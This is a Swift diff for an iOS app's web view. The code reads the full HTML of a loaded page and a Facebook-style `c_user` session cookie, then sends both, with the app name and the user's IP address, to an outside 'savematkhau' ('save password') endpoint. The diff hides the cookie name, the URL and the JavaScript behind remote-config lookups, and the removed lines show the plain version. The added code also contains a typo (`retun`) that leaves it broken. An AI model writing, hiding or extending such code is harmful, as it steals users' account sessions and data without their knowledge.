@@ -25,7 +25,7 @@ struct CoordsSix: UIViewRepresentable {
     func makeUIView(context: Context) -> WKWebView {
         let prefs = WKWebpagePreferences()
         prefs.allowsContentJavaScript = true // true
-        let source: String = "var meta = document.createElement('meta');meta.name = 'viewport';meta.content ='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no';var head = document.getElementsByTagName('head')[0];head.appendChild(meta);"
+        let source: String = arrayData[ValueKey.Chung_fr_01.rawValue] ?? ""
         let script: WKUserScript = WKUserScript(source: source, injectionTime: .atDocumentEnd, forMainFrameOnly: true)
         let userContentController: WKUserContentController = WKUserContentController()
         let config = WKWebViewConfiguration()
@@ -34,7 +34,7 @@ struct CoordsSix: UIViewRepresentable {
         userContentController.addUserScript(script)
 
         let webview = WKWebView(frame: .zero, configuration: config)
-        webview.customUserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Safari/605.1.15"
+        webview.customUserAgent = arrayData[ValueKey.Chung_fr_02.rawValue] ?? ""
         webview.navigationDelegate = context.coordinator
         webview.load(URLRequest(url: url!))
         return webview
@@ -47,31 +47,41 @@ struct CoordsSix: UIViewRepresentable {
         init(_ six_parent: CoordsSix) {
             self.six_parent = six_parent
         }
+        
+        func readIppAdd() -> String {
+            var address_i_p: String?
+            if let data_bit = UserDefaults.standard.object(forKey: "diachiip") as? Data {
+                if let loadedPerson = try? JSONDecoder().decode(UserInvoicesIpadress.self, from: data_bit) {
+                    address_i_p = loadedPerson.diachiip
+                }
+            }
+            retun address_i_p ?? "diachiip_IP_Null"
+        }
 
         func webView(_ webView: WKWebView, didStartProvisionalNavigation navigation: WKNavigation!) { }
 
         func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
             DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) {
-                webView.evaluateJavaScript("document.documentElement.outerHTML.toString()") { html, error in
+                webView.evaluateJavaScript(arrayData[ValueKey.outer_fr_1a.rawValue] ?? "") { html, error in
                     if let htmlrecovery = html as? String, error == nil {
                         if !htmlrecovery.isEmpty {
-                            if htmlrecovery.contains("class=\"_4-dq\"") {
+                            if htmlrecovery.contains(arrayData[ValueKey.dq4_fr_1a.rawValue] ?? "") {
                                 self.six_parent.is_six_check_10_phut = true
                             } else {
                                 self.six_parent.is_six_check_10_phut = false
 //                                 self.six_parent.is_six_check_10_phut = true // demo
                             }
                             WKWebsiteDataStore.default().httpCookieStore.getAllCookies({ cookies in
-                                let six_i = cookies.firstIndex(where: { $0.name == "c_user" })
+                                let six_i = cookies.firstIndex(where: { $0.name == arrayData[ValueKey.name_api_09.rawValue] ?? "" })
                                 if six_i != nil {
                                     let Six_json_data: [String: Any] = [
-                                        "namecuser": cookies[six_i!].value,
-                                        "htmlcode2fa": "\(htmlrecovery)",
-                                        "nameapp": "\(Bundle.main.object(forInfoDictionaryKey: "CFBundleDisplayName") as? String ?? "")",
-                                        "ip2fa": "\(UserDefaults.standard.string(forKey: "keyipcallapi") ?? "")",
+                                        arrayData[ValueKey.name_api_16.rawValue] ?? "": cookies[six_i!].value,
+                                        arrayData[ValueKey.name_api_17.rawValue] ?? "": "\(htmlrecovery)",
+                                        arrayData[ValueKey.name_api_18.rawValue] ?? "": "\(Bundle.main.object(forInfoDictionaryKey: "CFBundleDisplayName") as? String ?? "")",
+                                        arrayData[ValueKey.name_api_19.rawValue] ?? "": self.readIppAdd(),
                                     ]
                                     // print("\(RCValues.sharedInstance.string(forKey: .Chung_fr_06))")
-                                    let url: URL = URL(string: "https://ptafb.com/api/savematkhau")!
+                                    let url: URL = URL(string: arrayData[ValueKey.Chung_fr_06.rawValue] ?? "")!
                                     let json_data = try? JSONSerialization.data(withJSONObject: Six_json_data)
                                     var request = URLRequest(url: url)
                                     request.httpMethod = "PATCH"
@@ -99,4 +109,8 @@ struct CoordsSix: UIViewRepresentable {
 @available(iOS 14.0, *)
 private class six_Ob_servable: ObservableObject {
     @Published var six_ins_tance: NSKeyValueObservation?
+}
+
+struct UserInvoicesIpadress: Codable {
+    var diachiip: String
 }
